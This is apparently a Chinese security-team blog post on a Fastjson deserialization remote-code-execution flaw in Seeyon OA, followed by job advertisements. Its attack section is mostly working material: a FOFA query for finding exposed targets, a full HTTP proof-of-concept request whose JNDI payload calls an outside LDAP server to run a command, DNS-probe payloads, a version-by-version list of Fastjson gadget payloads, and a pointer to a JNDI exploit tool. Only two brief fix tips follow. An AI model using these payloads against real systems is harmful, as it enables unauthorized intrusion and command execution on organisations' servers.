> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yTuQLqqvikwo1KfK-zGBBA)

**STATEMENT**

**声明**

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

**NO.1 影响范围**

FOFA："seeyon" && city="xxxx" && after="2021-01-01"

```
V7.1、V7.1SP1
V7.0、V7.0SP1、V7.0SP2、V7.0SP3
V6.1、V6.1SP1、V6.1SP2
V6.0、V6.0SP1
V5.6、V5.6SP1
```

**NO.2 POC**

```
POST /seeyon/main.do?method=changeLocale HTTP/1.1
Host: 10.1.2.87
Content-Length: 221
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
cmd: ipconfig
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=26FF8158707BB0896A3ACD66EB92DD41; loginPageURL=
Connection: close

_json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xxx.xxx.xxx:1289/TomcatBypass/TomcatEcho","autoCommit":true}}
```

**NO.3** **漏洞复现**

**漏洞检测**

**Jndi 影响范围：**  
1、rmi 的利用方式：适用 jdk 版本：JDK 6u132、JDK 7u122、JDK 8u113 之前  
2、ldap 的利用方式：适用 jdk 版本：JDK 11.0.1、8u191、7u201、6u211 之前

**区分 FastJson 与 Jackson：**  
1）不闭合花括号看报错信息方法  
2）减少参数方法  
  {"name":"S", "age":21}//Fastjson 是不会报错  
  {"name":"S", "age":21,"xxx":123}// Jackson 语法相对比较严格, 会报错  
3）fastjson 报错关键词: 

com.alibaba.fastjson.JSONException , 触发方式如下  
 {"x":"  
 ["x":1]  
 {"x":{"@type":"java.lang.AutoCloseable"

**DNS 探测方法：  
注意：Content-Type: application/json**

```
# 未报错poc
{"x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}
{"x":{{"@type":"java.net.URL","val":"http://dnslog"}:"x"}}
{"x":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}

# 报错,但仍有效
{"x":{"@type":"java.net.Inet4Address","val":"dnslog"}}
{"x":{"@type":"java.net.Inet6Address","val":"dnslog"}}
{"x":Set[{"@type":"java.net.URL","val":"http://dnslog"}]}

# 报错,且返回400,但仍有效
{"x":Set[{"@type":"java.net.URL","val":"http://dnslog"}}
{"x":{{"@type":"java.net.URL","val":"http://dnslog"}:0}
```

**Fastjson 时间线**

**fastjson<=1.2.24(CNVD-2017-02833)**

```
{"v24":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://0.0.0.0","autoCommit":true}}
```

**fastjson<=1.2.41**

```
{"v41":{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://0.0.0.0","autoCommit":true}}
```

**fastjson<=1.2.42**

```
{"v42":{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://0.0.0.0","autoCommit":true}}
```

**fastjson<=1.2.43**

```
{"v43":{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://0.0.0.0","autoCommit":true]}}}
```

**fastjson<=1.2.45**

```
{"v45":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"},"xxx":{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://0.0.0.0"}}}
```

**fastjson<=1.2.47(CNVD-2019-22238)**

```
{"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://0.0.0.0","autoCommit":true}}
```

**fastjson<=1.2.59**

```
{"v59_error":{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://127.0.0.1"}}
{"v59_error":{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://127.0.0.1"}}
```

**fastjson<=1.2.61**

```
{"v61_error":{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"rmi://127.0.0.1"}}

{"v61_error":{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://127.0.0.1","Object":"a"}}
```

**fastjson<=1.2.62**

```
{"v62":{"@type":"org.apache.xbean.propertyeditor.JndiConverter","asText":"ldap://0.0.0.0"}}
{"v62_error":{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://0.0.0.0"}}}
{"v62_error":{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://0.0.0.0"}}
{"v62_error":{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor","parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://0.0.0.0"},"namespace":""}}
```

**fastjson<=1.2.66**

```
{"v66":{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory","jndiNames":["ldap://0.0.0.0"],"Realms":[""]}}
{"v66":{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://0.0.0.0"}}

{"v66_error":{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://0.0.0.0"}}
{"v66_error":{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://0.0.0.0"}}
```

**fastjson<=1.2.68**

```
写文件覆盖方法
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://0.0.0.0"}
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://0.0.0.0"}
```

**实战记录**

自行准备：JNDI-Injection-Exploit

(https://github.com/welk1n/JNDI-Injection-Exploit)

使用方法不在过多介绍  
**dnslog 初步探测**

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuoUDz16qvwsdRsQG9YCnHzFPLt7muCKNCGIBIWAr6RuK1JmGrpwYlOOA/640?wx_fmt=png)

**命令执行探测**

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuom4zTb3sbTJVicG31o14YHfcib5iaQj6ZynxrveGv8V62YwXUiaXsnXicxicg/640?wx_fmt=png)

有请求表示, ping 命令执行成功

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuoLIkjB0CdEyoBJsbWjKfib4WXEQOMCdgQUHPw6ibNTLwAwgsWjMyRlaXA/640?wx_fmt=png)

回显姿势

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuo6WQpgvSGAk0Y9LqfQpQb7l2zkSdpgYF4zN1SuiceloYXy8LJksddmsw/640?wx_fmt=png)

**修复建议**

1. 升级 fastjson 组件版本到最新  
2. 升级 oa 系统

**NO.4 参考**

https://www.secrss.com/articles/30425

http://service.seeyon.com/patchtools/tp.html# /patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=12 

[https://mp.weixin.qq.com/s/f2scum8wWcCeOOOR7nKHaQ](https://mp.weixin.qq.com/s?__biz=MzI4OTQ5Njc2Mw==&mid=2247484291&idx=1&sn=9b4b226517f4c63c071a5c4a21ea0156&scene=21#wechat_redirect)

[](https://mp.weixin.qq.com/s?__biz=MzI4OTQ5Njc2Mw==&mid=2247484291&idx=1&sn=9b4b226517f4c63c071a5c4a21ea0156&scene=21#wechat_redirect)[https://mp.weixin.qq.com/s/owEfyZsPEl61kQ100ALp4w](https://mp.weixin.qq.com/s?__biz=MzI4OTQ5Njc2Mw==&mid=2247484343&idx=1&sn=1c58f65d2c076fa1a6cbb2a3f2b3bbdd&scene=21#wechat_redirect) 

https://mp.weixin.qq.com/s?__biz=MzI4OTQ5Njc2Mw==&mid=2247484291&idx=1&sn=9b4b226517f4c63c071a5c4a21ea0156&scene=21# wechat_redirect

**RECRUITMENT**

**招聘启事**

**安恒雷神众测 SRC 运营（实习生）**  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

**设计师（实习生）**  

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；

3、精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
4、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  

————————  
公司：安恒信息  
岗位：**Web 安全 安全研究员**  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：**安全红队武器自动化工程师**  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至

bountyteam@dbappsecurity.com.cn

岗位：**红队武器化 Golang 开发工程师**  

薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至

bountyteam@dbappsecurity.com.cn

END

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CtGxzWjGs5uX46SOybVAyYzY0p5icTsasu9JSeiaic9ambRjmGVWuvxFbhbhPCQ34sRDicJwibicBqDzJQx8GIM3AQXQ/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JUtWVUtGyNMRco3QkL4hMnIdIznBrxZB2picXpSkW7aJQH1BI0vU8Dqaszu3lbYibfPUbOfScFV0ACg/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/0BNKhibhMh8eiasiaBAEsmWfxYRZOZdgDBevusQUZzjTCG5QB8B4wgy8TSMiapKsHymVU4PnYYPrSgtQLwArW5QMUA/640?wx_fmt=gif)

**长按识别二维码关注我们**